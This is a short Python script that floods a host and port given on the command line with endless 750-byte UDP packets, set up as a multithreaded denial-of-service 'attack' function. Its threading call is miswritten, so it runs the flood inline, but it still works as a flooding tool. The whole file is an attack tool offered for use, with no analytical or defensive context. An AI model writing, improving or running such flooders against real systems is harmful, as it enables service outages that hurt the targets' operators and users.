import sys
import threading
import requests
import socket

host = str(sys.argv[1])
port = int(sys.argv[2])
caranya = str(sys.argv[3])

loops = 1000000

def kirim_paket(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

def attack():
    if caranya == "UDP":
        for sequence in range(loops):
            threading.Thread(target=kirim_paket(750), daemon=True).start()

attack()
